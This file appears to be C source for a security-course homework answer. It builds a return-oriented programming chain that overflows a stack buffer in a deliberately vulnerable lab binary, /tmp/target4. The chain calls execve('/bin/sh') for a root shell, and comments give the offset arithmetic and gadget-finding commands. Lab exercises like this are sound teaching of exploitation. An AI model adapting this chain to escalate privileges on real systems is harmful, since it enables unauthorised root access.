#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target4"
#define DEFAULT_OUTPUT "/tmp/xploit4_output"

/*
 * Q1: ROP exploit for target4
 * ---------------------------
 * Vulnerability: foo() has `char buf[256]` and calls bar(input, buf, len),
 * which does memcpy(buf, input, len) with no bounds check. Since target4
 * read()s up to 4096 bytes from the input file, we overflow buf and overwrite
 * foo()'s saved return address. The binary is statically linked (musl),
 * non-PIE, built with -fno-stack-protector (no canary) and a NON-executable
 * stack, so we cannot run shellcode on the stack -- we ROP instead.
 *
 * Goal: perform the same syscall as shellcode.S:
 *     execve("/bin/sh", NULL, NULL)   -> rax=59, rdi="/bin/sh", rsi=0, rdx=0
 * setuid(0) has already run in main(), so this yields a ROOT shell.
 *
 * ---- Offset to the saved return address ----
 * In foo(): push rbp; mov rsp,rbp; and $-16,rsp; sub $0x110,rsp; buf=rsp+0x10.
 * In main(), rsp is 16-byte aligned before `call foo`, so on entry to foo
 * rsp % 16 == 8, which makes rbp-rsp == 0x110. The saved RIP is at rbp+8,
 * hence at buf + (0x110 + 8 - 0x10) = buf + 0x108 = buf + 264.
 *   -> 256 bytes buf + 8 bytes saved rbp = 264 bytes of padding.
 *
 * ---- Gadgets / addresses (REGENERATE ON THE VM) ----
 * These addresses were taken from a static musl build of target4. Because the
 * binary is deterministic (static, non-PIE) they are stable for a given
 * toolchain, but if the grader's VM uses a different musl/gcc the addresses
 * will differ. Regenerate them on the VM like so:
 *
 *   cd ~/hw2/targets && sudo make install     # builds /tmp/target4
 *   cd ~/hw2
 *   ./find_gadgets.py /tmp/target4 > gadgets.txt
 *   # (find_gadgets prints: "position: 0xADDR. insts: <gadget>. bytes: ..")
 *   grep -F 'insts: pop %rdi; ret.'                      gadgets.txt # POP_RDI
 *   grep -F 'insts: pop %rsi; ret.'                      gadgets.txt # POP_RSI
 *   grep -F 'insts: pop %rax; pop %rbx; pop %rbp; ret.'  gadgets.txt # POP_RAX_RBX_RBP
 *   grep -F 'insts: xor %edx,%edx; div %rbp;'            gadgets.txt # ZERO_RDX_DIV
 *   grep -F 'insts: syscall; ret.'                       gadgets.txt # SYSCALL
 *   # address of the "/bin/sh" string (get_shell() returns it):
 *   python3 -c 'from elftools.elf.elffile import ELFFile as E;\
f=open("/tmp/target4","rb");e=E(f);\
[print(hex(s["sh_addr"]+s.data().find(b"/bin/sh\0"))) \
 for s in e.iter_sections() if s["sh_addr"] and s.data().find(b"/bin/sh\0")!=-1]'
 */

#define OFFSET   264        /* bytes from buf[] to the saved return address   */
#define BINSH    0x404000   /* address of "/bin/sh" in .rodata                */

#define POP_RDI           0x40187f  /* pop %rdi; ret                          */
#define POP_RSI           0x401797  /* pop %rsi; ret                          */
#define POP_RAX_RBX_RBP   0x4029e8  /* pop %rax; pop %rbx; pop %rbp; ret       */
#define ZERO_RDX_DIV      0x40186d  /* xor %edx,%edx; div %rbp;               *
                                     * add $8,%rsp; pop %rbx; pop %rbp;        *
                                     * pop %r12..%r15; ret  (consumes 7 slots) */
#define SYSCALL           0x401b07  /* syscall; ret                           */

#define JUNK 0xdeadbeefdeadbeefULL

static size_t put(char *buf, size_t off, uint64_t v) {
  memcpy(buf + off, &v, sizeof(v));
  return off + sizeof(v);
}

int main(int argc, char *argv[])
{
  char exploit[512];
  size_t n = 0;

  /* 1) Padding up to the saved return address. */
  memset(exploit, 'A', OFFSET);
  n = OFFSET;

  /* 2) Set up registers for the div-based rdx zeroing:
   *    rax = 0, rbp = 1 (nonzero divisor so div rbp does not fault). */
  n = put(exploit, n, POP_RAX_RBX_RBP);
  n = put(exploit, n, 0);          /* rax = 0  */
  n = put(exploit, n, JUNK);       /* rbx      */
  n = put(exploit, n, 1);          /* rbp = 1  */

  /* 3) xor %edx,%edx; div %rbp  ->  rdx = 0 (0/1 = 0 rem 0).
   *    This gadget then does `add $8,%rsp` (skip 1 slot) and pops
   *    rbx, rbp, r12, r13, r14, r15 -> 7 stack slots of filler. */
  n = put(exploit, n, ZERO_RDX_DIV);
  for (int i = 0; i < 7; i++)
    n = put(exploit, n, JUNK);

  /* 4) rdi = "/bin/sh" */
  n = put(exploit, n, POP_RDI);
  n = put(exploit, n, BINSH);

  /* 5) rsi = 0 (argv = NULL) */
  n = put(exploit, n, POP_RSI);
  n = put(exploit, n, 0);

  /* 6) rax = 59 (SYS_execve). Does not touch rdx/rdi/rsi set above. */
  n = put(exploit, n, POP_RAX_RBX_RBP);
  n = put(exploit, n, 59);         /* rax = 59 */
  n = put(exploit, n, JUNK);       /* rbx      */
  n = put(exploit, n, JUNK);       /* rbp      */

  /* 7) syscall -> execve("/bin/sh", NULL, NULL) */
  n = put(exploit, n, SYSCALL);

  /* Write the exploit buffer to a file, then run the target on it. */
  write_xploit(exploit, n, DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}
